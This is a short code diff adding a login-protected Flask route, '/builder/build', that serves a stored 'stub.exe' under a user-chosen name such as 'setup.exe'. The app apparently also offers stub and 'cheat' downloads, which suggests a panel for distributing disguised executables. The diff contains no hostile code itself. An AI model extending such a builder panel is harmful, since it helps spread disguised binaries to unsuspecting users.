@@ -362,6 +362,28 @@ def download_stub():
     )
 
 
+@app.route('/builder/build', methods=['POST'])
+@login_required
+def build_stub():
+    """Build custom stub with selected options"""
+    user = User.query.get(session['user_id'])
+    filename = request.form.get('filename', 'setup')
+    filename = "".join(c for c in filename if c.isalnum() or c in ('_', '-', ' ')).strip() or 'setup'
+
+    stub_path = os.path.join(app.config['UPLOAD_FOLDER'], 'stub.exe')
+    if not os.path.exists(stub_path):
+        flash('Stub not found. Contact admin.', 'error')
+        return redirect(url_for('builder'))
+
+    from flask import send_file
+    return send_file(
+        stub_path,
+        as_attachment=True,
+        download_name=f"{filename}.exe",
+        mimetype='application/octet-stream'
+    )
+
+
 @app.route('/builder/cheat/<cheat_name>')
 @login_required
 def download_cheat(cheat_name):
